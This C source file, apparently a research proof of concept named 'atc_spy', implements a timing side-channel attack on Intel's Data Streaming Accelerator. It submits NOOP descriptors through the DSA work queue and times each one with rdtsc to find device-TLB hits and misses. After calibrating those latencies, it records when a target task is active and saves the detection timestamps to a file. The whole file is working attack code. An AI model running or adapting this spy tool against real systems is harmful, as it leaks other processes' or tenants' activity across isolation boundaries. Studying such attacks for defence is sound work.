#include "dsa.h"
#include <signal.h>

#define CALIBRATION_RUNS 10000
#define ATTACK_INTERVAL_US 3000
#define DIFF_THRESHOLD 300
#define NOISE_THRESHOLD 2000 // cycles
#define CALIBRATION_RETRIES 5
#define TRACE_BUFFER_SIZE 20000
const int TIMESTAMP_ENABLED = 1;

#define UPDATE_THRESHOLD(hit, miss) ((hit * 34 + miss * 66) / 100)

int keep_running = 1;
uint64_t detection_threshold;
struct wq_info wq_info;
struct dsa_hw_desc desc = {};
struct dsa_completion_record comp __attribute__((aligned(32))) = {};
struct timespec ts;

// traces
uint64_t trace_buffer[TRACE_BUFFER_SIZE];
double trace_timestamps[TRACE_BUFFER_SIZE];
int trace_index = 0, ts_index = 0;

void handler(int dummy) {
    keep_running = 0;
    printf("[atc_spy] Stopping...\n");
}

static inline uint64_t probe_atc(struct dsa_completion_record* comp) {
    uint64_t start, end;
    comp->status = 0;
    desc.completion_addr = (uintptr_t) comp;
    enqcmd(wq_info.wq_portal, &desc);
    start = rdtsc();
    while (comp->status == 0);
    end = rdtsc();
    return end - start;
}

// Save traces to file
void save_traces(char* taskname) {
    char filename[256];
    snprintf(filename, sizeof(filename), "atc-%s-%s.txt", taskname, 
             TIMESTAMP_ENABLED ? "ts" : "traces");

    FILE* fp = fopen(filename, "w");
    if (!fp) {
        fprintf(stderr, "[atc_spy] Failed to open file\n");
        return;
    }
    
    for (int i = 0; i < ts_index; i++)
        fprintf(fp, "%lf\n", trace_timestamps[i]);

    for (int i = 0; i < trace_index; i++)
        fprintf(fp, "%lu\n", trace_buffer[i]);
    
    fclose(fp);
    printf("[atc_spy] Saved to %s\n", filename);
}

int main(int argc, char *argv[]) {
    char *taskname;
    if (argc == 2) {
        taskname = argv[1];
        signal(SIGINT, handler);
    } else {
        printf("Usage: %s [prog-to-spy]\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    // Initialize work queue
    int rc = map_spec_wq(&wq_info, "/dev/dsa/wq0.0");
    if (rc) {
        fprintf(stderr, "[atc_spy] Failed to map work queue: %d\n", rc);
        return EXIT_FAILURE;
    }
    
    // Prepare NOOP descriptor
    desc.opcode = DSA_OPCODE_NOOP;
    desc.flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
    comp.status = 0;
    
    // Calibrate latencies
    int calib_retry = 0;
    struct dsa_completion_record comp_evict __attribute__((aligned(32))) = {};

calib:
    if (calib_retry++ > CALIBRATION_RETRIES) {
        printf("[cc_receiver] Calibration failed after %d retries\n", CALIBRATION_RETRIES);
        return EXIT_FAILURE;
    }
    
    uint64_t miss_total = 0, hit_total = 0;
    probe_atc(&comp);
    probe_atc(&comp_evict);

    for (int i = 0; i < CALIBRATION_RUNS; i++) {
        probe_atc(&comp_evict); // Evict DevTLB
        probe_atc(&comp);
        miss_total += probe_atc(&comp_evict);
        hit_total += probe_atc(&comp_evict); // Now in DevTLB
    }

    uint64_t avg_miss = miss_total / CALIBRATION_RUNS;
    uint64_t avg_hit = hit_total / CALIBRATION_RUNS;

    if (avg_miss <= avg_hit || avg_miss - avg_hit < DIFF_THRESHOLD) {
        printf("[INFO] Miss: %lu, Hit: %lu, Diff: %lu\n", 
               avg_miss, avg_hit, avg_miss - avg_hit);
        goto calib;
    }

    detection_threshold = UPDATE_THRESHOLD(avg_hit, avg_miss);
    
    printf("[INFO] Calibration results:\n");
    printf("\tDevTLB miss latency: %lu cycles\n", avg_miss);
    printf("\tDevTLB hit  latency: %lu cycles\n", avg_hit);
    printf("\tDetection threshold: %lu cycles\n", detection_threshold);
    
    printf("[atc_spy] Spying on task: %s\n", taskname);
    uint64_t tmp = 0;
    while (trace_index < TRACE_BUFFER_SIZE && keep_running) {
        probe_atc(&comp);
        usleep(ATTACK_INTERVAL_US);
        if (TIMESTAMP_ENABLED) tmp = probe_atc(&comp);
        else trace_buffer[trace_index++] = probe_atc(&comp);

        // saving timestamps
        if (TIMESTAMP_ENABLED && tmp > detection_threshold && tmp < NOISE_THRESHOLD) {
            clock_gettime(CLOCK_MONOTONIC, &ts);
            trace_timestamps[ts_index++] = (double) ts.tv_sec + (double) ts.tv_nsec / 1e9;
            printf("detected: %d\n", ts_index - 1);
        } else {
            usleep(10);
        } 
    }
    
    save_traces(taskname);

    return EXIT_SUCCESS;
}
